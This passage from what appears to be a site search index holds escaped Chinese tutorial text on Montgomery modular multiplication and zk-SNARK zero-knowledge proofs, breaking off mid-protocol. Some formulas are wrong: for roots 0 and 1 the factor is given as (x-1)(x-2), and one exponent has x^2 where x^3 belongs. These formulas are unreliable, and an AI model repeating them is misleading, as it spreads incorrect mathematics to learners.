2N-1]\\)\uff0c\u200b\u6b64\u65f6\u200b\u53ea\u200b\u9700\u8981\u200b\u7b80\u5355\u200b\u5224\u65ad\u200b\u4e00\u4e0b\u200b \\(t\\) \u200b\u548c\u200b \\(N\\) \u200b\u7684\u200b\u5927\u5c0f\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6c42\u200b\u51fa\u200b\u7b54\u6848\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u628a\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u6d41\u7a0b\u200b\u9006\u200b\u63a8\u51fa\u200b\u6765\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u4e24\u70b9\u200b\u89c2\u5bdf\u200b\u5f88\u200b\u91cd\u8981\u200b\uff1a\u200b\u4e00\u662f\u200b\u6362\u200b\u4e00\u4e2a\u200b\u5bb9\u6613\u200b\u505a\u200b\u9664\u6cd5\u200b\u7684\u200b\u9664\u6570\u200b \\(R\\)\uff0c\u200b\u60f3\u5230\u200b\u8981\u8bbe\u200b \\(t = (a * b + mN) / R\\)\uff1b\u200b\u4e8c\u662f\u200b\u5373\u4f7f\u200b\u8ba9\u200b\u6a21\u4e58\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b \\(R^{-1}\\)\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u59a8\u788d\u200b\u5b83\u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_7","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Wikipedia</li> <li>Analyzing and Comparing Montgomery Multiplication Algorithms</li> </ul>"},{"location":"cryptography/zk_snark.html","title":"zk-SNARK","text":"<p>zk-SNARK \u200b\u5168\u540d\u662f\u200b zero knowledge Succinct Non-interactive ARgument of Knowledge\uff0c\u200b\u662f\u200b\u4e00\u79cd\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u7279\u70b9\u200b\u662f\u200b\u7b80\u660e\u200b\uff08Succinct\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u4fe1\u606f\u91cf\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff1b\u200b\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\uff08Non-interactive\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b\u8005\u200b\u548c\u200b\u9a8c\u8bc1\u200b\u8005\u200b\u4e4b\u95f4\u200b\u8fdb\u884c\u200b\u591a\u6b21\u200b\u7684\u200b\u4ea4\u4e92\u200b\u3002</p> <p>\u200b\u672c\u6587\u200b\u57fa\u672c\u200b\u6309\u7167\u200b Why and How zk-SNARK Works: Definitive Explanation \u200b\u7684\u200b\u601d\u8def\u200b\u53bb\u200b\u63a2\u8ba8\u200b zk-SNARK \u200b\u7684\u200b\u539f\u7406\u200b\u548c\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6587\u4e2d\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e5f\u200b\u53c2\u8003\u200b\u4e86\u200b\u8be5\u200b\u6587\u7ae0\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_1","title":"\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e","text":"<p>\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u73b0\u5728\u200b\u6709\u200b\u4e00\u4e2a\u200b Prover \u200b\u548c\u200b\u4e00\u4e2a\u200b Verifier\uff0cProver \u200b\u53ef\u4ee5\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u67d0\u4ef6\u4e8b\u200b\u60c5\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u80fd\u200b\u8ba9\u200b Verifier \u200b\u77e5\u9053\u200b\u9690\u85cf\u200b\u7684\u200b\u79d8\u5bc6\u200b\u3002\u200b\u4f8b\u5982\u200b Prover \u200b\u8981\u200b\u8bc1\u660e\u200b\u81ea\u5df1\u200b\u62e5\u6709\u200b\u8d85\u8fc7\u200b\u4e00\u4e07\u5757\u200b\u7684\u200b\u5b58\u6b3e\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u200b\u5e0c\u671b\u200b Verifier \u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u5177\u4f53\u200b\u6709\u200b\u591a\u5c11\u200b\u5b58\u6b3e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c31\u200b\u9700\u8981\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_2","title":"\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u8bc1\u660e","text":""},{"location":"cryptography/zk_snark.html#_3","title":"\u6734\u7d20\u200b\u8bc1\u660e","text":"<p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b\u4e00\u4e2a\u200b\u573a\u666f\u200b\uff1aProver \u200b\u77e5\u9053\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u4e5f\u200b\u77e5\u9053\u200b\u5b83\u200b\u6709\u200b\u54ea\u4e9b\u200b\u6839\u200b\uff0c\u200b\u73b0\u5728\u200b\u5047\u8bbe\u200b\u8fd9\u4e9b\u200b\u6839\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e5f\u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u73b0\u5728\u200b Prover \u200b\u60f3\u8981\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u6709\u200b\u67d0\u200b\u51e0\u4e2a\u200b\u6839\u200b\uff08\u200b\u4e0d\u662f\u200b\u5168\u90e8\u200b\uff09\uff0c\u200b\u4f46\u200b\u53c8\u200b\u4e0d\u60f3\u200b\u544a\u8bc9\u200b Verifier \u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u7cfb\u6570\u200b\u662f\u200b\u591a\u5c11\u200b\uff0c\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u5462\u200b\uff1f</p> <p>\u200b\u4f8b\u5982\u200b \\(p(x)=x^3-3x^2+2x\\)\uff0c\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u6839\u662f\u200b \\(0, 1, 2\\)\uff0c\u200b\u60f3\u8981\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6839\u200b \\(0, 1\\)\uff0c\u200b\u600e\u4e48\u200b\u8bc1\u660e\u200b\u5462\u200b\uff1f</p> <p>\u200b\u5bf9\u4e8e\u200b Verifier \u200b\u6765\u8bf4\u200b\uff0c\u200b\u516c\u5f00\u200b\u4fe1\u606f\u200b\u662f\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u672a\u77e5\u200b\u7cfb\u6570\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u5b83\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6839\u200b \\(0, 1\\)\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u4e00\u5b9a\u200b\u5e26\u6709\u200b\u4e00\u4e2a\u200b\u56e0\u200b\u5f0f\u200b \\(t(x)=(x-1)(x-2)\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5b58\u5728\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b \\(h(x)\\) \u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ p(x)=t(x)h(x)=(x-1)(x-2)h(x) \\] <p>\u200b\u90a3\u4e48\u200b\u5e26\u5165\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b \\(x\\)\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b \\(p(x)\\) \u200b\u548c\u200b \\(h(x)\\) \u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u5982\u679c\u200b Prover \u200b\u60f3\u200b\u6b3a\u9a97\u200b Verifier\uff0c\u200b\u5b83\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u5e76\u200b\u6ca1\u6709\u200b\u6240\u200b\u8981\u200b\u8bc1\u660e\u200b\u7684\u200b\u6839\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(p(1) \\ne 0\\)\uff0c\u200b\u90a3\u4e48\u200b \\(x-1\\) \u200b\u5c31\u200b\u4e0d\u662f\u200b \\(p(x)\\) \u200b\u7684\u200b\u56e0\u5f0f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u6574\u9664\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b \\(h(x)\\)\u3002\u200b\u6240\u4ee5\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u51fa\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e00\u4e2a\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\uff1a</p> <ol> <li>Verifier \u200b\u968f\u673a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b \\(x_0\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Prover</li> <li>Prover \u200b\u8ba1\u7b97\u200b \\(p(x_0)\\) \u200b\u548c\u200b \\(h(x_0)\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b \\(p(x_0)=(x_0-1)(x_0-2)h(x_0)\\)\uff0c\u200b\u5e76\u4e14\u200b \\(p(x_0)\\) \u200b\u548c\u200b \\(h(x_0)\\) \u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8bf4\u660e\u200b\u6ca1\u6709\u200b\u51fa\u9519\u200b</li> </ol> <p>\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b Prover \u200b\u6b3a\u9a97\u200b\u4e86\u200b Verifier\uff0c\u200b\u90a3\u4e48\u200b\u8ba1\u7b97\u200b \\(h(x_0)\\) \u200b\u4e00\u6b65\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5e76\u200b\u4e0d\u200b\u5b58\u5728\u200b\u6574\u9664\u200b\u7684\u200b \\(h(x_0)\\)\u3002\u200b\u4f8b\u5982\u200b \\(p(x)=2x^3-3x^2+2x\\)\uff0c\u200b\u60f3\u8981\u200b\u8bc1\u660e\u200b\u6709\u200b\u56e0\u5f0f\u200b \\(t(x)=(x-1)(x-2)\\)\uff0c\u200b\u5982\u679c\u200b Verifier \u200b\u968f\u673a\u200b\u51fa\u200b\u4e00\u4e2a\u200b \\(x=4\\)\uff0c\u200b\u90a3\u4e48\u200b \\(p(x)=88\\)\uff0c\\(t(x)=6\\)\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e0d\u200b\u6574\u9664\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0cProver \u200b\u8bc1\u660e\u200b\u5931\u8d25\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6982\u7387\u200b\uff0c\u200b\u867d\u7136\u200b\u591a\u9879\u5f0f\u200b\u4e0d\u200b\u6574\u9664\u200b\uff0c\u200b\u4f46\u662f\u200b\u7b97\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u662f\u200b\u53ef\u4ee5\u200b\u6574\u9664\u200b\u7684\u200b\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b\u591a\u6b21\u200b\u8fdb\u884c\u200b\u4e0a\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u7528\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u968f\u7740\u200b\u968f\u673a\u200b\u6b21\u6570\u200b\u589e\u52a0\u200b\uff0c\u200b\u8bc1\u660e\u200b\u7684\u200b\u53ef\u4fe1\u5ea6\u200b\u5c31\u200b\u8d8a\u200b\u9ad8\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ee3\u4ef7\u200b\u4e5f\u200b\u5c31\u200b\u968f\u4e4b\u200b\u4e0a\u5347\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b Prover \u200b\u8fd8\u662f\u200b\u6709\u200b\u4f5c\u5f0a\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u968f\u673a\u200b\u4e00\u4e2a\u200b\u503c\u200b\u5c31\u200b\u5f53\u6210\u200b \\(h(x_0)\\)\uff0c\u200b\u7136\u540e\u200b\u8ba1\u7b97\u200b \\(p(x_0)=t(x_0)h(x_0)\\)\uff0c\u200b\u518d\u200b\u53d1\u7ed9\u200b Verifier\u3002\u200b\u6b64\u65f6\u200b Prover \u200b\u5176\u5b9e\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4e00\u4e2a\u200b\u6574\u9664\u200b \\(t(x)\\) \u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\u3002</p>"},{"location":"cryptography/zk_snark.html#_4","title":"\u540c\u6001\u200b\u52a0\u5bc6","text":"<p>\u200b\u65e2\u7136\u200b Prover \u200b\u53ef\u4ee5\u200b\u4f2a\u9020\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u662f\u5426\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u540c\u6001\u200b\u52a0\u5bc6\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8ba9\u200b Prover \u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u591a\u9879\u5f0f\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u53c8\u200b\u65e0\u6cd5\u200b\u4f2a\u9020\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff1f</p> <p>\u200b\u7b54\u6848\u200b\u662f\u200b\u53ef\u4ee5\u200b\uff0c\u200b\u53c2\u8003\u200b RSA \u200b\u6216\u8005\u200b Diffie-Hellman \u200b\u7684\u200b\u601d\u8def\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u5bf9\u200b\u67d0\u4e2a\u200b\u6570\u505a\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u200b\u66b4\u9732\u200b\u8fd9\u4e2a\u200b\u6570\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u6307\u6570\u200b\u8fd0\u7b97\u200b\uff1a</p> \\[ E(v) = g^v \\pmod n \\] <p>\u200b\u5176\u4e2d\u200b \\(v\\) \u200b\u662f\u200b\u539f\u59cb\u6570\u636e\u200b\uff0c\\(g\\) \u200b\u662f\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u90a3\u4e48\u200b Verifier \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(E(v)\\) \u200b\u4ee5\u540e\u200b\uff0c\u200b\u628a\u200b \\(E(v)\\) \u200b\u4ea4\u7ed9\u200b Prover \u200b\u53bb\u200b\u8ba1\u7b97\u200b\u3002Prover \u200b\u4e0d\u200b\u77e5\u9053\u200b \\(g\\) \u200b\u548c\u200b \\(v\\)\uff0c\u200b\u53ea\u80fd\u200b\u8001\u8001\u5b9e\u5b9e\u200b\u5730\u53bb\u200b\u5e26\u5165\u200b\u591a\u9879\u5f0f\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\u3002\u200b\u539f\u6765\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u52a0\u6cd5\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b \\(E(x)\\) \u200b\u7684\u200b\u4e58\u6cd5\u200b\u3002\u200b\u539f\u6765\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u6570\u4e58\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b \\(E(x)\\) \u200b\u7684\u200b\u5e42\u200b\u8fd0\u7b97\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7f3a\u70b9\u200b\uff0c\u200b\u5c31\u662f\u200b\u65e0\u6cd5\u200b\u8fdb\u884c\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u4e58\u6cd5\u200b\uff1a\u200b\u5df2\u77e5\u200b \\(g^a\\) \u200b\u548c\u200b \\(g^b\\)\uff0c\u200b\u65e0\u6cd5\u200b\u8ba1\u7b97\u200b \\(g^{ab}\\)\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u4ece\u200b \\(E(x)\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(E(x^2)\\)\uff0c\u200b\u53ea\u80fd\u200b\u8ba1\u7b97\u200b \\(E(2x)=E(x)^2\\)\u3002\u200b\u6240\u4ee5\u200b\u6c42\u200b \\(E(x^i)\\) \u200b\u8fd9\u200b\u4e00\u6b65\u200b\u9700\u8981\u200b\u7531\u200b Verifier \u200b\u63d0\u524d\u5b8c\u6210\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b \\(p(x)=x^3-3x^2+x\\)\uff0c\u200b\u5c31\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> \\[\\begin{align} E(x^3)^1E(x^2)^{-3}E(x)^1 &amp;= (g^{x^3})^1(g^{x^2})^{-3}(g^x)^1 \\\\ &amp;= g^{x^3}g^{-3x^2}g^x \\\\ &amp;= g^{x^2-3x^2+x} \\end{align}\\] <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u5c31\u662f\u200b\u628a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u8fd0\u7b97\u200b\u632a\u5230\u200b\u4e86\u200b\u6307\u6570\u200b\u4e0a\u9762\u200b\u3002\u200b\u4f46\u662f\u200b Prover \u200b\u770b\u5230\u200b\u7684\u200b\u53ea\u662f\u200b \\(E(x^3), E(x^2), E(x)\\)\uff0c\u200b\u5e76\u4e0d\u77e5\u9053\u200b\u5b9e\u9645\u200b\u7684\u200b \\(x\\) \u200b\u662f\u200b\u591a\u5c11\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u7ed9\u200b Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) \u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(E(p(s))\\) \u200b\u548c\u200b \\(E(h(s))^{t(s)}\\)\uff0c\u200b\u5224\u65ad\u200b\u4e24\u8005\u200b\u662f\u5426\u200b\u76f8\u7b49\u200b\uff1a\\(E(h(s))^{t(s)}=(g^{h(s)})^{t(s)}=g^{h(s)t(s)}=g^{p(s)}=E(p(s))\\)</li> </ol> <p>\u200b\u6ce8\u610f\u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u53ea\u6709\u200b Verifier \u200b\u624d\u80fd\u200b\u505a\u200b\uff0c\u200b\u56e0\u4e3a\u200b Prover \u200b\u5e76\u4e0d\u77e5\u9053\u200b \\(s\\) \u200b\u7684\u200b\u503c\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u534f\u8bae\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b Prover \u200b\u771f\u7684\u200b\u7528\u200b\u4e86\u200b \\(E(s^i)\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u7ed3\u679c\u200b\u3002\u200b\u6240\u4ee5\u200b\u63a5\u4e0b\u6765\u200b\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u4f55\u200b\u4fdd\u8bc1\u200b Prover \u200b\u771f\u7684\u200b\u62ff\u200b \\(E(s^i)\\) \u200b\u53bb\u200b\u5e26\u5165\u200b\u5230\u200b \\(E(p(s))\\) \u200b\u7684\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\u53bb\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u7ed3\u679c\u200b\u53d1\u7ed9\u200b Verifier\u3002</p>"},{"location":"cryptography/zk_snark.html#knowledge-of-exponent-assumption","title":"Knowledge-of-Exponent Assumption","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u79cd\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u8ba9\u200b Prover \u200b\u53ef\u4ee5\u200b\u8bc1\u660e\u200b\u5b83\u200b\u786e\u5b9e\u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u6570\u505a\u200b\u4e86\u200b\u4e58\u6cd5\u200b\uff08\u200b\u5bf9\u5e94\u200b\u4e0a\u9762\u200b\u7684\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff09\u3002\u200b\u601d\u8def\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>Verifier \u200b\u6709\u200b\u4e00\u4e2a\u200b\u6570\u200b \\(a\\)\uff0c\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b Prover \u200b\u5bf9\u200b \\(a\\) \u200b\u8fdb\u884c\u200b\u4e86\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u200b\u8fdb\u884c\u200b\u4e86\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\u3002</li> <li>Verifier \u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b \\(\\alpha\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(a' = a^{\\alpha} \\pmod n\\)\uff0c\u200b\u628a\u200b \\(a\\) \u200b\u548c\u200b \\(a'\\) \u200b\u53d1\u9001\u7ed9\u200b Prover</li> <li>Prover \u200b\u8981\u200b\u5bf9\u200b \\(a\\) \u200b\u8fdb\u884c\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6b21\u6570\u200b\u662f\u200b \\(c\\)\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b \\(b=a^c \\pmod n\\) \u200b\u4ee5\u53ca\u200b \\(b' = (a')^c \\pmod n\\)\uff0c\u200b\u628a\u200b \\(b\\) \u200b\u548c\u200b \\(b'\\) \u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u9a8c\u8bc1\u200b\uff1a\\(b^{\\alpha} = b' \\pmod n\\)</li> </ol> <p>\u200b\u5982\u679c\u200b\u9a8c\u8bc1\u200b\u6b63\u786e\u200b\uff0c\u200b\u8bf4\u660e\u200b Prover \u200b\u5bf9\u200b\u4e24\u4e2a\u200b\u6570\u200b \\(a\\) \u200b\u548c\u200b \\(a'\\) \u200b\u6c42\u200b\u4e86\u200b\u540c\u6837\u200b\u6b21\u6570\u200b\u7684\u200b\u5e42\u200b\uff08\u200b\u5bf9\u5e94\u200b\u591a\u9879\u5f0f\u200b\u91cc\u200b\uff0c\u200b\u4e58\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u6574\u200b\u7cfb\u6570\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u5bf9\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6570\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u9a8c\u8bc1\u200b\u901a\u8fc7\u200b\u3002\u200b\u56de\u987e\u200b\u4e0a\u200b\u4e00\u200b\u5c0f\u8282\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u90e8\u5206\u200b\uff1aProver \u200b\u60f3\u8981\u200b\u4f5c\u5f0a\u200b\u7684\u8bdd\u200b\uff0c\u200b\u9700\u8981\u200b\u6784\u9020\u200b\u4e00\u4e2a\u200b \\(E(h(s))\\) \u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b \\(E(p(s))\\)\uff0c\u200b\u5982\u679c\u200b\u5bf9\u200b \\(E(h(s))\\) \u200b\u6216\u8005\u200b \\(E(p(s))\\) \u200b\u8fdb\u884c\u200b\u4e0a\u8ff0\u200b\u5904\u7406\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(E(h(s))\\) \u200b\u548c\u200b \\(E(p(s))\\) \u200b\u5c31\u200b\u53ea\u80fd\u200b\u662f\u200b\u5bf9\u200b \\(E(s^i)\\) \u200b\u6c42\u200b \\(c\\) \u200b\u6b21\u65b9\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd9\u200b\u6b63\u597d\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6c42\u503c\u200b\u8fc7\u7a0b\u200b\u3002</p> <p>\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c\u200b\u7ed9\u5b9a\u200b \\(1, s, s^2, \\ldots, s^d\\) \u200b\u8fd9\u4e9b\u200b\u503c\u200b\uff0c\u200b\u8981\u6c42\u200b\u53ea\u80fd\u200b\u7528\u200b\u8fd9\u4e9b\u200b\u6570\u200b\u8fdb\u884c\u200b\u52a0\u6cd5\u200b\u548c\u200b\u6570\u4e58\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7ed3\u679c\u200b\u4e00\u5b9a\u200b\u662f\u200b\u67d0\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u5728\u200b \\(s\\) \u200b\u5904\u200b\u7684\u200b\u53d6\u503c\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u6b64\u65f6\u200b\u7684\u200b\u5b8c\u6574\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\alpha\\)\uff0c\u200b\u5e26\u5165\u200b \\(E(s^i)^{\\alpha} = g^{\\alpha{}s^{i}}\\)</li> <li>Verifier \u200b\u7ed9\u200b Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\) \u200b\u548c\u200b \\(E(s^0)^{\\alpha}, E(s^1)^{\\alpha}, \\ldots, E(s^d)^{\\alpha}\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) 